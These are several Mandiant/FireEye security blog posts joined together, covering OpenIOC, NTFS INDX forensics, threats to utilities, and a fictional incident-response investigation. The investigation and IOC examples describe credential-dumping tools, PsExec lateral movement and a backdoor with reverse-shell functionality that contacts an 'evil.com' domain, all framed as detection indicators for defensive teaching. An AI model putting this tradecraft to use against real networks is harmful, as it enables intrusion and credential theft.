                "text": "Welcome to my first post as a FireEye™ employee! Many of you have asked me what I think of FireEye's acquisition of Mandiant. One of the aspects of the new company that I find most exciting is our increased threat intelligence capabilities. This post will briefly explore what that means for our customers, prospects, and the public. By itself, Mandiant generates threat intelligence in a fairly unique manner from three primary sources. First, our professional services division learns about adversary tools, tactics, and procedures (TTPs) by assisting intrusion victims. This \"boots on the ground\" offering is unlike any other, in terms of efficiency (a small number of personnel required), speed (days or weeks onsite, instead of weeks or months), and effectiveness (we know how to remove advanced foes). By having consultants inside a dozen or more leading organizations every week of the year, Mandiant gains front-line experience of cutting-edge intrusion activity. Second, the Managed Defense™ division operates our software and provides complementary services on a multi-year subscription basis. This team develops long-term counter-intrusion experience by constantly assisting another set of customers in a managed security services model. Finally, Mandiant's intelligence team acquires data from a variety of sources, fusing it with information from professional services and managed defense. The output of all this work includes deliverables such as the annual M-Trends report and last year's APT1 document , both of which are free to the public. Mandiant customers have access to more intelligence through our software and services. As a security software company, FireEye deploys powerful appliances into customer environments to inspect and (if so desired) quarantine malicious content. Most customers choose to benefit from the cloud features of the FireEye product suite . This decision enables community self-defense and exposes a rich collection of the world's worst malware. As millions more instances of FireEye's MVX technology expand to mobile, cloud and data center environments, all of us benefit in terms of protection and visibility. Furthermore, FireEye's own threat intelligence and services components generate knowledge based on their visibility into adversary software and activity. Recent examples include breaking news on Android malware, identifying Yahoo! systems serving malware, and exploring \"cyber arms\" dealers. Like Mandiant, FireEye's customers benefit from intelligence embedded into the MVX platforms. Many have looked at the Mandiant and FireEye combination from the perspective of software and services. While these are important, both ultimately depend on access to the best threat intelligence available. As a combined entity, FireEye can draw upon nearly 2,000 employees in 40 countries, with a staff of security consultants, analysts, engineers, and experts not found in any other private organization. Stay tuned to the FireEye and Mandiant blogs as we work to provide an integrated view of adversary activity throughout 2014. I hope you can attend the FireEye + Mandiant - 4 Key Steps to Continuous Threat Protection webinar on Wednesday, Jan 29 at 2pm ET. During the webinar Manish Gupta, FireEye SVP of Products, and Dave Merkel, Mandiant CTO and VP of Products will discuss why traditional IT security defenses are no longer the safeguards they once were and what's now needed to protect against today's advanced threats.

                "text": "With the buzz in the security industry this year about sharing threat intelligence, it's easy to get caught up in the hype, and believe that proper, effective sharing of Indicators or Intelligence is something that can just be purchased along with goods or services from any security vendor. It's really a much more complex problem than most make it out to be, and one that we've been working on for a while. A large part of our solution for managing Threat Indicators is using the OpenIOC standard format. Since its founding, Mandiant sought to solve the problem of how to conduct leading-edge Incident Response (IR) - and how to scale that response to an entire enterprise. We created OpenIOC as an early step in tackling that problem. Mandiant released OpenIOC to the public as an Open Source project under the Apache 2 license in November of 2011, but OpenIOC had been used internally at Mandiant for several years prior. IR is a discipline that usually requires highly trained professionals doing very resource-intensive work. Traditionally, these professionals would engage in time-intensive investigations on only a few hosts on a compromised network. Practical limitations on staffing, resources, time, and money would prevent investigations from covering anything other than a very small percentage of most enterprises. Responders would only be able to examine what they had direct access to, with their corresponding conclusions constrained by time and budget. This level of investigation was almost never enough to give confidence on anything other than the hosts that had been examined - responders were unable to confirm whether other systems were still compromised, or whether the adversary still had footholds in other parts of the network. Creating a standard way of recording Threat Intelligence into an Indicator was part of what allowed Mandiant to bring a new approach to IR, including the use of an automated solution, such as Mandiant for Intelligent Response® (MIR®) . Mandiant's new strategy for IR enabled investigators, who previously could only get to a few hosts in an engagement, to now query entire enterprises in only slightly more time. Using OpenIOC as a standardized format, the Indicators of Compromise (IOCs) were recorded once, and then used to help gather the same information and conduct the same testing on every host across the enterprise via the automated solution. Incident Responders could now spend only a little more time, but cover an exponentially larger number of hosts during the course of an investigation. Recording the IOCs in OpenIOC had other benefits as well. Indicators from one investigation could be shared with other investigations or organizations, and allow investigators to look for the exact same IOCs wherever they were, without having to worry about translation problems associated with ambiguous formats, such as lists or text documents. One investigator could create an IOC, and then share it with others, who could put that same IOC into their investigative system and look for the same evil as the first person, with little to no additional work. The format grew organically over time. We always intended that the format be expandable and improvable. Instead of trying to map out every possible use case, Mandiant has updated the format and expanded the dictionaries of IOC Terms as new needs have arisen over time. The version we released in 2011 as \"1.0\" had already been revised and improved upon internally several times before its Open Source debut. We continue to update the standard as needed, allowing for features and requests that we have received over time from other users or interested parties. Unlike traditional \"signatures,\" OpenIOC provides the ability to use logical comparison of Indicators in an IOC, providing more flexibility and discrimination than simple lists of artifacts. An extensive library of Indicator Terms allows for a variety of information from hosts and networks to be recorded, and if something is not covered in the existing terms, additional terms may be added. Upcoming features like parameters will allow for further expansion of the standard, including customization for application or organization specific use cases. Having the OpenIOC standard in place is tremendously powerful, providing benefits for scaling detection and investigation, both of which are key parts of managing the threat lifecycle. OpenIOC enables easy, standardized information sharing once implemented, without adding much to workloads or draining resources. And it is freely available as Open Source; so that others can benefit from some of the methods we have already found to work well in our practice. We hope that as we improve it, you can take even more advantage of what OpenIOC has to offer in your IR and Threat Intelligence workflows. Next up in the Back to Basics: OpenIOC series, we'll talk about some of the basics of what OpenIOC is and what using it involves - and some of the upcoming things in the future of OpenIOC.

                "text": "There's often a lot of rhetoric in the press and in the security community around threats to the utilities industry, and risk exposure surrounding critical infrastructure. We've determined that the utilities industry (power, water, waste) has been, and likely will continue to be, a target for cyber espionage primarily from Chinese APT groups. We also anticipate that U.S. utilities infrastructure is vulnerable to computer network attack (CNA) from a variety of threat actors motivated by a desire to disrupt, deny access, or destroy. It's important to recognize the difference between actors seeking to steal data or intellectual property, and actors seeking to destroy systems or cause mass destruction. Often the distinction between computer network exploitation (CNE) and CNA gets lost in media coverage that bundles diverse cyber activity together. The type of cyber activity has implications for how we tackle the problem, thus it's key to distinguish. As part of our incident response and managed defense work, Mandiant has observed Chinese APT groups exploiting the computer networks of U.S. utilities enterprises servicing or providing electric power to U.S. consumers, industry, and government. The most likely targeted information for data theft in this industry includes smart grid technologies, water and waste management expertise, and negotiations information related to existing or pending deals involving Western utilities companies operating in China. Why would Chinese APT Groups Seek to Exploit Utilities? Since 2010, Mandiant has responded to what we assessed were Chinese cyber espionage incidents occurring at multiple utilities companies involved in electric power generation. We recognize the PRC's utilities sector for electric power development, construction, operations, and distribution is heavily concentrated on a select few state-owned enterprises (SOE) with close ties to the central government. We suspect these relationships provide APT groups with a fundamental incentive to conduct espionage to attain advanced technology and operations expertise. By way of possible motivation, the PRC is in the midst of a historic makeover that involves the transformation of urban infrastructures, which, by 2025, is likely to produce 15 mega-cities with an average of 25 million inhabitants, or about the entire population of the United States. [i] The impacts from this transition are intensifying pressures on an already fragile and outdated utilities infrastructure in China that currently struggles to provide sufficient electric power, water, and waste treatment. We believe APT groups are stealing data that will allow them to improve historic PRC urbanization efforts and the modernization of infrastructure, which is receiving billions of government investment dollars for development. While we have tracked multiple attributed Chinese APT groups active in the utilities industries, we certainly don't discount that other, non-Chinese state-sponsored (or independent) actors could be engaged in data theft related to utilities. The Risk of Disruptive Cyber Attacks Computer network attacks (CNA) - that is, offensive cyber operations meant to disrupt or destroy-are also a threat to the utilities industry from state actors in times of major conflict. Perpetrators may include hostile adversaries, possibly nation-states, during times of escalated tensions, or terrorist operatives who gain the required expertise. The threat of a state-sponsored actor or proxy targeting this industry using CNA is a growing concern, particularly in the case of Iran, though wide-scale data theft is the primary type of threat we've observed to this point. Several large US news outlets did recently report that Iranian-based actors infiltrated some of the US' industrial control systems, however, and some have speculated their motivation in doing so was to map the network or identify resources for future attack scenarios.

                "text": "By William Ballenthin & Jeff Hamm On August 30, 2012, we presented a webinar on how to use INDX buffers to assist in an incident response investigation. During the Q&A portion of the webinar we received many questions; however, we were not able to answer all of them. We're going to attempt to answer the remaining questions by posting a four part series on this blog. This series will address: Part 1: Extracting an INDX Attribute Part 2: The Internal Structures of a File Name Attribute Part 3: A Step by Step Guide to Parse INDX Part 4: The Internal Structures of an INDX Structure Part 1: Extracting an INDX Record An INDX buffer in the NTFS file system tracks the contents of a folder. INDX buffers can be resident in the $MFT (Master File Table) as an index root attribute (attribute type 0x90) or non-resident as an index allocation attribute (attribute 0xA0) (non-resident meaning that the content of the attribute is in the data area on the volume.) INDX root attributes have a dynamic size in the MFT, so as the contents change, the size of the attributes change. When an INDX root attribute shrinks, the surrounding attributes shift and overwrite any old data. Therefore, it is not possible to recover slack entries from INDX root attributes. On the other hand, the file system driver allocates INDX allocation attributes in multiples of 4096, even though the records may only be 40 bytes. As file system activity adds and removes INDX records from an allocation attribute, old records may still be recoverable in the slack space found between the last valid entry and the end of the 4096 chunk. This is very interesting to a forensic investigator. Fortunately, many forensic tools support extracting the INDX allocation attributes from images of an NTFS file system. Scenario Let's say that during your investigation you identified a directory of interest that you want to examine further. In the scenario we used during the webinar, we identified a directory as being of interest because we did a keyword search for \"1.rar\". The results of the search indicated that the slack space of an INDX attribute contained the suspicious filename \"1.rar\". The INDX attribute had the $MFT record number 49. Before we can parse the data, we need to extract the valid index attribute's content. Using various forensic tools, we are capable of this as demonstrated below. The SleuthKit We can use the SleuthKit tools to extract both the INDX root and allocation data. To extract the INDX attribute using the SleuthKit, the first step is to identify the $MFT record IDs for the attributes of the inode. We want the content of the index root attribute (attribute type 0x90 or 144d) and the index allocation attribute (attribute type 0xA0 or 160d). To identify the attribute IDs, run the command: istat -f ntfs ntfs.dd 49 The istat command returns inode information from the $MFT. In the command we are specifying the NTFS file system with the \"-f\" switch. The tool reads a raw image named \"ntfs.dd\" and locates record number 49. The result of our output (truncated) was as follows: .... Attributes: Type: $STANDARD_INFORMATION (16-0) Name: Resident size: 72 ... Type: $I30 (144-6) Name: $I30 Resident size: 26 Type: $I30 (160-7) Name: $I30 Non-Resident size: 4096 The information returned for the attribute list includes the index root - $I30 (144-6) - and an index allocation - $I30 (160-7). The attribute identifier is the integer listed after the dash. Therefore, the index root attribute 144 has an identifier of 6, and the index allocation attribute 160 has an identifier of 7. With this information, we can gather the content of the attributes with the SleuthKit commands: icat -f ntfs ntfs.dd 49-144-6 > INDX_ROOT.bin icat -f ntfs ntfs.dd 49-160-7 > INDX_ALLOCATION.bin The icat command uses the NTFS module to identify the record (49) attribute (144-6 and 144-7), and outputs the attribute data into the respective files INDX_ROOT.bin and INDX_ALLOCATION.bin. EnCase We can use EnCase to extract the INDX allocation data. To use EnCase version 6.x to gather the content of the INDX buffers, in the explorer tree, right click the folder icon. The \"Copy/UnErase...\" option applied to a directory will copy the content of the INDX buffer as a binary file. Specify a location to save the file. Note that the \"Copy Folders...\" option will copy the directory and its contents and will NOT extract the INDX structure. FTK We can use the Forensic Toolkit (FTK) to extract the INDX allocation data. Using FTK or FTK Imager, the INDX allocation attributes appear in the file list pane. These have the name \"$I30\" because the stream name is identified as $I30 in the index root and index allocation attributes. To extract the content of an index attribute, in the explorer pane, highlight the folder. In the file list pane, right click the relevant $I30 file and choose the option to \"export\". This will prompt you for a location to save the binary content. Mandiant Intelligent Response ® The Mandiant Intelligent Response ® (MIR) agent v.2.2 has the ability to extract INDX records natively. To generate a list of INDX buffers in MIR, run a RAW file audit. One of the options in the audit is to \"Parse NTFS INDX Buffers\". You can run this recursively, or you can target specific directories. We recommend the latter because this option will generate numerous entries when done recursively. To display a list of parsed INDX buffers, you can filter a file listing in MIR by choosing the \"FileAttributes\" are \"like\" \"*INDX*\". The MIR agent recognizes \"INDX\" as an attribute because the files listed in the indices may or may not be deleted. Results Regardless of which method is used, your binary file should begin with the string \"INDX\" if you grabbed the correct data stream. You can verify the results quickly in a hex editor. Ensure that the first four bytes of the binary data is the string \"INDX\". Conclusion This example demonstrates three ways to use various tools to extract INDX attribute content. Our next post will detail the internal structures of a file name attribute. A file name attribute will exist for each file tracked in a directory. These structures include the MACb (Modified, Accessed, Changed, and birth) times of a file and can be a valuable timeline source in an investigation.

                "text": "When I joined Mandiant earlier this year, I was given the opportunity to help write our annual M-Trends report . This is the third year Mandiant has published the report, which is a summary of the trends we've observed in our investigations over the last twelve months. I remember reading Mandiant's first M-Trends report when it came out in 2010 and recall being surprised that Mandiant didn't pull any punches. They talked about the advanced persistent threat or APT (they had been using that term for several years...long before it was considered a cool marketing, buzz word), and they were open about the origin of the attacks. The report summarized what I'd been seeing in industry, and offered useful insights for detection and response. Needless to say, I enjoyed the opportunity to work on the latest version. In this year's report it details six trends we identified in 2011. We developed the six trends for the report very organically. That is, I spent quite a few days and nights reading all of the reports from our outstanding incident response team and wrote about what we saw-we didn't start with trends and then look for evidence to support them. If you haven't picked up a copy of the report yet, you can do so here . I will be blogging on each of the six trends over the next two weeks; you can even view the videos we've developed for each trend as each blog post is published: Malware Only Tells Half the Story . Of the many systems compromised in each investigation, about half of them were never touched by attacker malware. In so many cases, the intruders logged into systems and took data from them (or used them as a staging point for exfiltration), but didn't install tools. It is ironic that the very systems that hold the data targeted by an attacker are probably the least likely to have malware installed on them. While finding the malware used in an intrusion is important, it is impossible to understand the full scope of an intrusion if this is the focal point of the investigation. We illustrate actual examples of this in the graphical spread on pages 6-7 of the report. What does this mean for victim organizations? You could start by looking for malware, but don't end there! A smart incident response process will seek to fully understand the scope of compromise and find all impacted systems in the environment. This could mean finding the registry entries that identify lateral movement, traces of deleted .rar files in unallocated space, or use of a known compromised account. It turns out that Mandiant has a product that does all of this, but the footnote on page 5 is the only mention you'll see in the entire report (and even that was an afterthought).

                "text": "On March 15, Mandiant hosted an executive briefing over breakfast in New York City. The location in the W Hotel in Downtown NYC overlooked the 9/11 Memorial and the rising One World Trade Center-an arresting view and a unique setting for this event. Former Secretary of Homeland Security Michael Chertoff kicked off the morning by discussing his perspective on the global threat landscape. He touched on Iran's cyber warfare capabilities in particular. He remarked on recent alleged Iranian attacks against the BBC and said that there is no point in debating the reality of cyber war . If one side believes they are engaged in such a battle, then that is reality-and \"Iran clearly believes they are already participants in cyber war.\" He also noted that Iran's capabilities are already quite advanced. After being hit by Stuxnet, Iran views it as imperative to be prepared to respond in kind. It is always nice to see someone like Mr. Chertoff connecting the dots so articulately on a technical level. At one point, he commented about how important it was to not just look for malware. Smart responders, he said, need to look for all trace evidence of compromise in order to fully understand the scope of an incident. Coincidentally, this is trend #1 in our recent M-Trends report , and Mr. Chertoff described the problem with a malware-centric approach perfectly. Richard Bejtlich spoke next and used a role-playing exercise to help the audience understand the challenge of responding to targeted threats. His premise was simple: \"Pretend I'm a law enforcement agent who comes to your office and tells you that you are compromised, and that I have your own internal documents as evidence. What do you do next?\" This provoked discussion and the audience started asking questions about the nature of the intrusion and what they should do to respond. As we explored the scenario through Q&A, it became clear that most organizations lack the visibility they need to adequately respond to attacks. What about your organization? If you found out today that you had been the victim of a substantial breach, where would you look first? How would you validate the intrusion? How could you discover the scopeor identify what had been stolen? Those of you who have attended Mandiant events know that we are pretty light on the product pitches (we often don't mention our products at all). However, we do have a product that helps answer the questions that Richard was posing. Mandiant Intelligent Response has helped hundreds of companies answer the question \"Now What??\" when they are on the receiving end of the scenario Richard outlined in New York.

This gives us a front-row seat to witness what works (and what doesn't) when it comes to finding attackers and preventing them from stealing our clients' data. Attackers' tactics and motives are evolving and as a result our security strategies also need to adapt. Today, we announced two new service offerings that will further help our clients improve their protective, detective, and responsive security controls and leverage Mandiant's extensive experience responding to some of the most serious cyber security incidents. Our first new service offering addresses attackers' expanding motives. We are starting to see attackers with destructive motives and what could be more damaging than attacking a nation's critical infrastructure. Security incidents at critical infrastructure such as electric power grids, utilities and manufacturing companies can affect the lives of hundreds of thousands of people. Our new Industrial Control Systems (ICS) Security Gap Assessment is specifically focused on helping these industries - and others that use SCADA systems - to assess their existing security processes for industrial control systems. The service helps identify security GAPs and provides specific recommendations to close those GAPs and safeguard critical infrastructure. Our second new service offering is designed to help organizations address the challenges they face as they build out their own internal security operations program and incident response teams. Many organizations want to enhance their internal capabilities beyond the traditional security operations centers (SOCs). Our new Cyber Defense Center Development service helps organizations evolve their internal SOC by improving the visibility (monitoring and detection) and response capabilities (incident response) necessary to defend against advanced threats. This service looks at existing people, process, and technologies and identifies areas for improvement. It helps companies to identify and prioritize the alerts that require the most immediate action with the goal to reduce the mean time to remediation.

                "text": "Written by Will Gibb & Devon Kerr In our blog post \"Investigating with Indicators of Compromise (IOCs) - Part I ,\" we presented a scenario involving the \"Acme Widgets Co.,\" a company investigating an intrusion, and its incident responder, John. John's next objective is to examine the system \"ACMWH-KIOSK\" for evidence of attacker activity. Using the IOCs containing the tactics, techniques and procedures (TTPs) he developed during the analysis of \"ACM-BOBBO,\" John identifies the following IOC hits: Table 1: IOC hit summary After reviewing IOC hits in Redline™ , John performs Live Response and put together the following timeline of suspicious activity on \"ACMWH-KIOSK\". Table 2: Summary of significant artifacts John examines the timeline in order to surmise the following chain of activities: On October 15, 2013, at approximately 16:17:56 UTC, the attacker performed a type 3 network logon, described here , to \"ACMWH-KIOSK\" from \"ACM-BOBBO\" using the ACME domain service account, \"backupDaily.\" A few seconds later, the attacker copied two executables, \"acmCleanup.exe\" and \"msspcheck.exe,\" from \"ACM-BOBBO\" to \"C:$RECYCLE.BIN.\" By generating MD5 hashes of both files, John determines that \"acmCleanup.exe\" is identical to the similarly named file on \"ACM-BOBBO\", which means it won't require malware analysis. Since the MD5 hash of \"msspcheck.exe\" was not previously identified, John sends binary to a malware analyst, whose analysis reveals that \"msspcheck.exe\" is a variant of the \"acmCleanup.exe\" malware. About a minute later, at 16:19:02 UTC, the attacker executed the Sysinternals PsExec remote command execution utility, which ran for approximately three minutes. During this time period, event logs recorded the start and stop of the \"WCE SERVICE\" service, which corresponds to the execution of the Windows Credentials Editor (WCE). John can assume PsExec was used to execute WCE, which is reasonable given the timeline of events and artifacts present on the system. About seven minutes, later the registry recorded the modification of a Run key associated with persistence for \"msspcheck.exe.\" Finally, at 16:48:11 UTC, the attacker logged off from \"ACMWH-KIOSK\". John found no additional evidence of compromise. Since the IOCs are living documents, John's next step is to update his IOCs with relevant findings from his investigation of the kiosk system. John updates the \"acmCleanup.exe (BACKDOOR)\" IOC with information from the \"msspcheck.exe\" variant of the attacker's backdoor including: File metadata like filename and MD5. A uniquely named process handle discovered by John's malware analyst. A prefetch entry for the \"msspcheck.exe\" binary. Registry artifacts associated with persistence of \"msspcheck.exe.\" From there, John double-checks the uniqueness of the additional filename with some search engine queries. He can confirm that \"msspcheck.exe\" is a unique filename and update his \"acmCleanup.exe (BACKDOOR)\" IOC. By updating his existing IOC, John ensures that he will be able to identify evidence attributed to this specific variant of the backdoor. Changes to the original IOC have been indicated in green. The updated IOC can be seen below: Figure 1: Augmented IOC for acmCleanup.exe (BACKDOOR) John needs additional information before he can start to act. He knows two things about the attacker that might be able to help him out: The attacker is using a domain service account to perform network logons. The attacker has been using WCE to obtain credentials and the \"WCE SERVICE\" service appears in event logs. John turns to his security event and incident management (SEIM) system, which aggregates logs from his domain controllers, enterprise antivirus and intrusion detection systems. A search of type 3 network logons using the \"backupDaily\" domain account turns up 23 different systems accessed using that account. John runs another query for the \"WCE SERVICE\" and sees that logs from 3 domain controllers contain that service event. John needs to look for IOCs across all Acme machines in a short period of time. Subscribe to Blogs Get email updates as new blog posts are added."

                "text": "Written by Devon Kerr & Will Gibb The Back to Basics: OpenIOC blog series previously discussed how Indicators of Compromise (IOCs) can be used to codify information about malware or utilities and describe an attacker's methodology. Also touched on were the parts of an IOC, such as the metadata, references, and definition sections. This blog post will focus on writing IOCs by providing a common investigation scenario, following along with an incident response team as they investigate a compromise and assemble IOCs. Our scenario involves a fictional organization, \"Acme Widgets Co.\", which designs, manufactures and distributes widgets. Last week, this organization held a mandatory security-awareness training that provided attendees with an overview of common security topics including password strength, safe browsing habits, email phishing and the risks of social media. During the section on phishing, one employee expressed concern that he may have been phished recently. Bob Bobson, an administrator, indicated that some time back he'd received a strange email about a competitor's widget and was surprised that the PDF attachment wouldn't open. A member of the security operations staff, John Johnson, was present during the seminar and quickly initiated an investigation of Bob's system using the Mandiant Redline™ host investigation tool. John used Redline to create a portable collectors configured to obtain live response data from Bob's system which included file system metadata, the contents of the registry, event logs, web browser history, as well as service information. John ran the collectors on Bob's system and brought the data back to his analysis workstation for review. Through discussions with Bob, John learned that the suspicious e-mail likely arrived on October 13, 2013. After initial review of the evidence, John assembled the following timeline of suspicious activity on the system. Table 1: Summary of significant artifacts Based on this analysis, John pieced together a preliminary narrative: The attacker sent a spear-phishing email to Bob which contained a malicious PDF attachment, \"Ultrawidget.pdf\", which Bob saved to the desktop on October 10, 2013, at 20:19:07 UTC. Approximately five minutes later, at 20:24:44 UTC, the file \"C:WINDOWSSysWOW64acmCleanup.exe\" was created as well as a Run key used for persistence. These events were likely the result of Bob opening the PDF. John sent the PDF to a malware analyst to determine the nature of the exploit used to infect Bob's PC. The first IOC John writes describes the malware identified on Bob's PC, \"acmCleanup.exe\", as well as the malicious PDF. IOCs sometimes start out as rudimentary - looking for the known file hashes, filenames and persistence mechanisms of the malware identified. Here is what an initial IOC looks like: Figure 1: Initial IOC for acmCleanup.exe (BACKDOOR) As analysis continues, these IOCs are updated and improved - incorporating indicator terms from malware and intelligence analysis as well as being refined based on the environment. In this sense, the IOC is a living document. For example, additional analysis may reveal more registry key information, additional files which may be written to disk, or information for identifying the malware in memory. Here is the same IOC, after augmenting it with the results of malware analysis: Figure 2: Augmented IOC for acmCleanup.exe (BACKDOOR) The augmented IOC will continue to identify the exact malware discovered on Bob's PC. This improved IOC will also identify malware which has things in common with that backdoor: Malware which uses the same Mutex, a process attribute that will prevent the machine from being infected multiple times with the same backdoor Malware which performs DNS queries for the malicious domain \"23vsx.evil.com\" Malware which has a specific set of import functions; in this case which correspond to reverse shell and keylogger functionality Beginning on October 11, the attacker accessed the system and executed the Windows command \"ipconfig\" at 20:24:00 UTC, resulting in the creation of a prefetch file. Approximately five minutes later, the attacker began uploading files to \"C:$RECYCLE.BIN\". Based on review of their MD5 hashes, three files (\"wce.exe\", \"getlsasrvaddr.exe\", \"update.exe\") were identified as known credential dumping utilities while others (\"filewalk32.exe\", \"rar.exe\") were tools for performing file system searches and creating WinRAR archives. These items should be recorded in an IOC, as a representation of an attacker's tools, techniques and procedures (TTPs). It is important to know that an attacker is likely to have interacted with many more systems than were infected with malware; for this reason it is crucial to look for evidence that an attacker has accessed systems. Some of the most common activities attackers perform on these systems include password-dumping, reconnaissance and data theft. Seeing that the attacker had staged file archives and utilities in the \"$Recycle.Bin\" folder, John also created an IOC to find artifacts present there. This IOC was designed to identify files in the root of the \"$Recycle.Bin\" directory; or to identify if a user (notably, the attacker) tried to access the \"$Recycle.Bin\" folder by manually typing it in the address bar of Explorer by checking TypedPaths in the Registry. This is an example of encapsulating an attacker's TTPs in an OpenIOC form. Figure 3: IOC for Unusual Files in \"C:RECYCLER\" and \"C:$RECYCLE.BIN\" (Methodology) On October 15, 2013, at 12:15:37 UTC, the Sysinternals PsExec utility was created in \"C:$RECYCLE.BIN\". Approximately four hours later, at 16:11:03 UTC, the attacker used the Internet Explorer browser to access text files located in \"C:$RECYCLE.BIN\". Between 16:11:03 UTC and 16:11:06 UTC, the attacker accessed two text files which were no longer present on the system. At 16:17:55 UTC, the attacker mounted the remote hidden share \"\\10.20.30.101C$\". At 16:20:29 UTC, the attacker executed the Windows \"tree\" command, resulting in the creation of a prefetch file, a command which produces a filesystem listing. At 17:37:37 UTC, the attacker created one WinRAR archive, \"C:$Recycle.Bina.rar\" which contained two text files, \"c.txt\" and \"a.txt\". These text files contained output from the Windows \"tree\" and \"ipconfig\" commands. No further evidence was present on the system. John noted that the earliest event log entries present on the system start approximately two minutes after the creation of \"a.rar\". It is likely that the attacker cleared the event logs before disconnecting from the system. John identified the lateral movement to the 10.20.30.101 host, from \"ACM-BOBBO\" through registry keys that recorded the mount of the hidden C$ share. By recording this type of artifact in an IOC, John will be able to quickly see if the attacker has pivoted to another part of the Acme Widgets Co. network when investigating 10.20.30.101. He included artifacts looking for other common hidden shares such as IPC$ and ADMIN$. The effectiveness of an IOC may be influenced by the environment the IOC was created for. This IOC, for example, may generate a significant number of false-positives in an environment where these hidden shares are legitimately used. At Acme Widgets Co., however, the use of hidden shares is considered highly suspicious. Figure 4 IOC for Lateral Movement (Methodology) At the end of the day, John authored three new IOCs based on his current investigation. He knows that if he records the artifacts he identified from his investigation into the \"ACM-BOBBO\" system, he can apply that knowledge to the investigation of the host at 10.20.30.101. Once he collects information on 10.20.30.101 with his Redline portable collector, he'll be able to match IOCs against the Live Response data, which will let him identify known artifacts quickly prior to beginning Live Response analysis. Although John is using these IOCs to search systems individually, these same IOCs could be used to search for evidence of attacker activity across the enterprise. Armed with this set of IOCs, John sets out to hunt for evil on the host at \"10.20.30.101\". Stay tuned for our next blog post, seeing how this investigation develops.

During the past year, we've offered intelligence and analysis on new threat activity, sponsored open source projects and offered insight on free tools like Redline™ , all of which has been highlighted on our blog. In case you've missed it, here are some of our most popular posts: Challenges in Malware and Intelligence Analysis: Similar Network Protocols, Different Backdoors and Threat Groups In this post, Mandiant's Intel shares insight on threat activity. Specifically, two separate APT groups, using two different backdoors that had very similar networking protocols. Read more to learn what they found. New Release: OWASP Broken Web Applications Project VM Version 1.1 Chuck Willis overviews version 1.1 of the Mandiant-sponsored OWASP Broken Web Applications Project Virtual Machine (VM). If you are not familiar with this open source project, it provides a freely downloadable VM containing more than 30 web applications with known or intentional security vulnerabilities. Many people use the VM for training or self-study to learn about web application security vulnerabilities, including how to find them, exploit them, and fix them. It can also be used for other purposes such as testing web application assessment tools and techniques or understanding evidence of web application attacks. Back to Basics Series: OpenIOC Will Gibb and a few of his colleagues at Mandiant embark on a series going back to the basics and looking deeper at OpenIOC - how we got where we are today, how to make and use IOCs, and the future of OpenIOC. Check out related posts here: The History of OpenIOC , Back to the Basics , OpenIOC, IOC Writer and Other Free Tools. Live from Black Hat 2013: Redline, Turbo Talk, and Arsenal Sitting poolside at Black Hat USA 2013, Mandiant's Kristen Cooper chats with Ted Wilson about Redline in this latest podcast. Ted leads the development of Redline where he provides innovative investigative features and capabilities enabling both the seasoned investigator and those with considerably less experience to answer the question, \"have you been compromised?\" Utilities Industry in the Cyber Targeting Scop e Our intel team is back again, this time with an eye on the utilities industry. As part of our incident response and managed defense work, Mandiant has observed Chinese APT groups exploiting the computer networks of U.S. utilities enterprises servicing or providing electric power to U.S. consumers, industry, and government. The most likely targets for data theft in this industry include smart grid technologies, water and waste management expertise, and negotiations information related to existing or pending deals involving Western utilities companies operating in China.

                "text": "Written by Will Gibb & Devon Kerr One challenge investigators face during incident response is finding a way to organize information about an attackers' activity, utilities, malware and other indicators of compromise, called IOCs. The OpenIOC format addresses this challenge head-on. OpenIOC provides a standard format and terms for describing the artifacts encountered during the course of an investigation. In this post we're going to provide a high-level overview of IOCs, including IOC use cases, the structure of an IOC and IOC logic. Before we continue, it's important to mention that IOCs are not signatures, and they aren't meant to function as a signature would. It is often understated, but an IOC is meant to be used in combination with human intelligence. IOCs are designed to aid in your investigation, or the investigations of others with whom you share threat intelligence. IOC Use Cases: There are several use cases for codifying your IOCs, and these typically revolve around your objectives as an investigator. The number of potential use cases is quite large, and we've listed some of the most common use cases below: Find malware/utility : This is the most common use case. Essentially, this is an IOC written to find some type of known malware or utility, either by looking for attributes of the binary, itself, or for some artifact created upon execution, such as a prefetch file or registry key. Methodology : Unlike an IOC written to identify malware or utilities, these IOCs find things you don't necessarily know about, in order to generate investigative leads. For example, if you wanted to identify any service DLL that wasn't signed and which was loaded from any directory that did not include the path \"windowssystem32\", you could write an IOC to describe that condition. Another good example of a methodology IOC is an IOC that looks for the Registry text value of all \"Run\" keys for a string ending \".jpg\". This represents an abnormal condition which upon investigation may lead to evidence of a compromise. Bulk : You may already be using this kind of IOC. Many organizations subscribe to threat intelligence feeds that deliver a list of MD5s or IP addresses; a bulk IOC can represent a collection of those indicators. These kinds of IOCs are very black and white and are typically only good for an exact match. Investigative : As you investigate systems in an environment and identify evidence of malicious activity such as metadata related to the installation of backdoors, execution of tools, or files being staged for theft, you can track that information in an IOC. These IOCs are similar to bulk IOCs; however, an investigative IOC only contains indicators from a single investigation. Using this type of IOC can help you to prioritize which systems you want to analyze. IOC components: An IOC is made up of three main parts: IOC metadata, references and the definition. Let's examine each one of these more closely, noting that we're using the Mandiant IOC Editor (IOCe) downloadable from the Mandiant website: Metadata : IOC metadata describes information like the author of the IOC (jsmith@domain.tld), the name of the IOC (Evil.exe (BACKDOOR) and a brief description such as \"This variant of the open source Poison Ivy backdoor has been configured to beacon to 10.127.10.128 and registers itself as \"Microsoft 1atent time services\". References : Within the IOC, references can find information like the name of an investigation or case number, comments and information on the maturity of the IOC such as Alpha, Beta, Release, etc. This data can help you to understand where the IOC fits in your library of threat intelligence. One common use for references is to associate an IOC with a particular threat group. It is not uncommon for certain references to be removed from IOCs when sharing IOCs with third parties. Definition : This is the content of the IOC, containing the artifacts that an investigator decided to codify in the IOC. For example, these may include the MD5 of a file, a registry path or something found in process memory. Inside the definition, indicators are listed out or combined into expressions that consist of two terms and some form of Boolean logic. One thing about the OpenIOC format that makes it particularly useful is the ability to combine similar terms using Boolean AND & OR logic. The previous example shows how this type of logic can be used. This type of IOC describes three possible scenarios: The name of a service is \"MS 1atent time services\" - OR - The ServiceDLL name for any service contains \"evil.exe\" - OR - The filename is \"bad.exe\" AND the filesize attribute of that file is within the range 4096 to 10240 bytes. When you use Boolean logic, remember the following: An AND requires that both sides of the expression are true An OR requires that one side of the expression is true Understanding that the Boolean statements, such as 'The name of a service is \"MS 1atent time services\", OR \"filename is \"bad.exe\" AND the filesize attribute of that file is within the range 4096 to 10240 bytes\"', are evaluated separately is an important aspect understanding how the logic within an IOC works. These statements are not if-else statements, nor do they both have to exist in order for the IOC to have a match. When investigating a host, if the \"MS 1atent time services\" service is present, this IOC would have a match; regardless of whether or not the malicious file the IOC described was present on the host as well. In our next post we're going to have a crash course in writing IOC definitions using the Mandiant IOC editor, IOCe. Subscribe to 